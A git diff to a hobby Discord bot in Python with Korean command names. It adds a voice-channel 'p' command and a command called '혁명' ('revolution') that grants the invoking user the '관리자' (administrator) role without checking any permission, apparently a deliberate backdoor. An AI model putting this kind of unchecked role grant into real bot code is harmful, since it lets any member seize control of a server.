@@ -3,6 +3,7 @@ from discord import message
 from discord import channel
 from discord.ext import commands
 from discord.utils import deprecated
+from discord.utils import get
 import requests
 from bs4 import BeautifulSoup
 import time
@@ -33,6 +34,12 @@ alphabet = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q",
 @bot.event
 async def on_ready():
     print("마이야히 마이야하")
+
+@bot.command(name="혁명", pass_context=True)
+async def _HumanRole(ctx, member: discord.Member=None):
+    member = ctx.message.author
+    await member.add_roles(get(ctx.guild.roles, name="관리자"))
+    await ctx.channel.send(str(member)+"에게 역할이 적용되었습니다.")
 
 @bot.command()
 async def 야(ctx):
@@ -144,6 +151,12 @@ async def 십진수_이진수(ctx, text):
 
     c = "1" + c
     await ctx.send(c)
+
+@bot.command()
+async def p(ctx, text):
+    channel = ctx.author.voice.channel
+    await channel.connect()
+    await ctx.send("!p " + text + "")
 
 @bot.command()
 async def 이진수_영어(ctx, text):
